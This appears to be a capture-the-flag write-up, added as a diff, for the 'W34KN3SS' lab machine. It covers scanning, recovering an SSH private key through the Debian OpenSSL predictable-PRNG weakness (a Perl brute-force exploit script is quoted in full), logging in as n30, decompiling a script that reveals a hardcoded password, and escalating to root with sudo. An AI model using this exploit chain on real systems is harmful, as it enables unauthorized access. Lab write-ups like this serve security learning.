@@ -1,0 +1,329 @@
+This is a simple boot2root machine.
+IP: 192.168.0.108
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 -p- 192.168.0.108
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 18:27 IST
+Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 100.00% done; ETC: 18:28 (0:00:00 remaining)
+Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 92.84% done; ETC: 18:28 (0:00:00 remaining)
+Nmap scan report for 192.168.0.108
+Host is up (0.0018s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)
+|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)
+|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo
+| Not valid before: 2018-05-05T11:12:54
+|_Not valid after:  2019-05-05T11:12:54
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/20%OT=22%CT=1%CU=39123%PV=Y%DS=2%DC=T%G=Y%TM=5F6751E
+OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=8946%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT     ADDRESS
+1   0.34 ms LAPTOP-U5913CMD.mshome.net (172.23.176.1)
+2   1.30 ms 192.168.0.108
+
+
+---- Scanning URL: http://192.168.0.108/ ----
+==> DIRECTORY: http://192.168.0.108/blog/                                                                                             
++ http://192.168.0.108/index.html (CODE:200|SIZE:10918)                                                                               
++ http://192.168.0.108/server-status (CODE:403|SIZE:301)                                                                              
+==> DIRECTORY: http://192.168.0.108/test/                                                                                             
+==> DIRECTORY: http://192.168.0.108/uploads/                                                                                          
+                                                                                                                                      
+---- Entering directory: http://192.168.0.108/blog/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                      
+---- Entering directory: http://192.168.0.108/test/ ----
++ http://192.168.0.108/test/index.html (CODE:200|SIZE:72)  
+
+Got an image might need some stego tricks.
+
+So I got stuck with this and did not know what to do.
+
+Then I looked at the nmap results again and saw something interesting.
+
+
+ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jordan
+
+weakness.jth
+
+We were getting error while accessing the 192.168.0.108:443
+
+So edited my /etc/hosts file and visited weakness.jth
+
+And voila Got something new which is better than being stucked.
+This is what I found:
+
+keep following the white rabbit :D
+
+         ,
+            /|      __
+           / |   ,-~ /
+          Y :|  //  /
+          | jj /( .^
+          >-"~"-v"
+         /       Y
+        jo  o    |
+       ( ~T~     j
+        >._-' _./
+       /   "~"  |
+      Y     _,  |
+     /| ;-"~ _  l
+    / l/ ,-"~    \
+    \//\/      .- \
+     Y        /    Y    -n30
+     l       I     !
+     ]\      _\    /"\
+    (" ~----( ~   Y.  )
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Ok so fired up dirb to find some hidden directories that might contain some intersting stuffs.
+
+---- Scanning URL: http://weakness.jth/ ----
++ http://weakness.jth/index.html (CODE:200|SIZE:526)                                                                                  
+==> DIRECTORY: http://weakness.jth/private/                                                                                           
++ http://weakness.jth/robots.txt (CODE:200|SIZE:14)                                                                                   
++ http://weakness.jth/server-status (CODE:403|SIZE:300)                                                                               
+                                                                                                                                      
+---- Entering directory: http://weakness.jth/private/ ----
+==> DIRECTORY: http://weakness.jth/private/assets/                                                                                    
+==> DIRECTORY: http://weakness.jth/private/files/                                                                                     
++ http://weakness.jth/private/index.html (CODE:200|SIZE:989)                                                                          
+                                                                                                                                      
+---- Entering directory: http://weakness.jth/private/assets/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                      
+---- Entering directory: http://weakness.jth/private/files/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sun Sep 20 19:14:31 2020
+DOWNLOADED: 9224 - FOUND: 4
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF# 
+
+This /private/ directory looks interesting.Lets see -->
+
+Ok so the private directory contains two files:
+
+->> One file named mykey.pub 
+->> Other file named notes.txt
+
+
+notes.txt => this key was generated by openssl 0.9.8c-1
+
+** Remember this version, that might help. 
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg
++ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
+
+Also the openssl 0.9.8c-1 has some exploit and you can read about this exploit at the following url:
+
+https://github.com/g0tmi1k/debian-ssh
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF# searchsploit openssl 0.9.8c-1
+----------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                       |  Path
+----------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Perl)       | linux/remote/5622.txt
+OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Python)     | linux/remote/5720.py
+OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Ruby)       | linux/remote/5632.rb
+----------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+1. Download http://sugar.metasploit.com/debian_ssh_rsa_2048_x86.tar.bz2
+            https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
+
+2. Extract it to a directory
+
+3. Enter into the /root/.ssh/authorized_keys a SSH RSA key with 2048 
+Bits, generated on an upatched debian (this is the key this exploit will 
+break)
+
+4. Run the perl script and give it the location to where you extracted 
+the bzip2 mentioned.
+
+#!/usr/bin/perl
+my $keysPerConnect = 6;
+unless ($ARGV[1]) {
+   print "Syntax : ./exploiter.pl pathToSSHPrivateKeys SSHhostToTry\n";
+   print "Example: ./exploiter.pl /root/keys/ 127.0.0.1\n";
+   print "By mm@deadbeef.de\n";
+   exit 0;
+}
+chdir($ARGV[0]);
+opendir(A, $ARGV[0]) || die("opendir");
+while ($_ = readdir(A)) {
+   chomp;
+   next unless m,^\d+$,;
+   push(@a, $_);
+   if (scalar(@a) > $keysPerConnect) {
+      system("echo ".join(" ", @a)."; ssh -l root ".join(" ", map { "-i 
+".$_ } @a)." ".$ARGV[1]);
+      @a = ();
+   }
+}
+
+5. Enjoy the shell after some minutes (less than 20 minutes)
+
+Regards,
+Markus Mueller
+mm@deadbeef.de
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF# cat mykey.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF# 
+
+First extract and change to that directory.
+Go into the directory and grep for the following key:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF/rsa/2048# grep -r -l "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw=="
+4161de56829de2fe64b9055711f531c1-2537.pub
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF/rsa/2048# 
+
+We can use this to break the ssh and login.
+4161de56829de2fe64b9055711f531c1-2537
+
+lets try now.
+
+-n30
+
+n30 can be the user lets try to login into ssh
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF/rsa/2048# ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@192.168.0.108
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
+n30@W34KN3SS:~$ id
+uid=1000(n30) gid=1000(n30) groups=1000(n30),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+n30@W34KN3SS:~$ 
+
+Woah that's nice :P
+
+n30@W34KN3SS:~$ cat user.txt
+25e3cd678875b601425c9356c8039f68
+n30@W34KN3SS:~$ 
+
+The n30 directory contains code and it python 2.7 compiled.
+When I executed the code it was something related to hash generating.
+So I searched for python decompiler and decompiled the following code in my machine.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF# wget http://192.168.0.108:1234/code
+--2020-09-20 19:51:59--  http://192.168.0.108:1234/code
+Connecting to 192.168.0.108:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1138 (1.1K) [application/octet-stream]
+Saving to: 'code'
+
+code                              100%[============================================================>]   1.11K  --.-KB/s    in 0.003s  
+
+2020-09-20 19:51:59 (343 KB/s) - 'code' saved [1138/1138]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WeaknessCTF#  
+
+
+We can use python decompiler as it is in binary format.
+
+# Python bytecode 2.7 (62211)
+# Embedded file name: code.py
+# Compiled at: 2018-05-08 23:50:54
+# Decompiled by https://python-decompiler.com
+import os, socket, time, hashlib
+print ('[+]System Started at : {0}').format(time.ctime())
+print '[+]This binary should generate unique hash for the hardcoded login info'
+print '[+]Generating the hash ..'
+inf = ''
+inf += chr(ord('n'))
+inf += chr(ord('3'))
+inf += chr(ord('0'))
+inf += chr(ord(':'))
+inf += chr(ord('d'))
+inf += chr(ord('M'))
+inf += chr(ord('A'))
+inf += chr(ord('S'))
+inf += chr(ord('D'))
+inf += chr(ord('N'))
+inf += chr(ord('B'))
+inf += chr(ord('!'))
+inf += chr(ord('!'))
+inf += chr(ord('#'))
+inf += chr(ord('B'))
+inf += chr(ord('!'))
+inf += chr(ord('#'))
+inf += chr(ord('!'))
+inf += chr(ord('#'))
+inf += chr(ord('3'))
+inf += chr(ord('3'))
+hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
+print ('[+]Your new hash is : {0}').format(hashf)
+print '[+]Done'
+ 
+n30: dMASDNB!!#B!#!#33
+
+Got this username and password.
+Lets try to escalate the privileges.
+First lets try to check if the password is correct or not.
+
+n30@W34KN3SS:~$ sudo -l
+[sudo] password for n30: 
+Matching Defaults entries for n30 on W34KN3SS:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User n30 may run the following commands on W34KN3SS:
+    (ALL : ALL) ALL
+n30@W34KN3SS:~$ 
+
+Woah now we can simply use sudo bash to get root shell : )))
+
+n30@W34KN3SS:~$ sudo bash
+root@W34KN3SS:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@W34KN3SS:~# cd /root
+root@W34KN3SS:/root# ls
+root.txt
+root@W34KN3SS:/root# cat root.txt
+a1d2fab76ec6af9b651d4053171e042e
+root@W34KN3SS:/root# 
+
+GG bois 
+
+Thank you....Happy Hacking :)
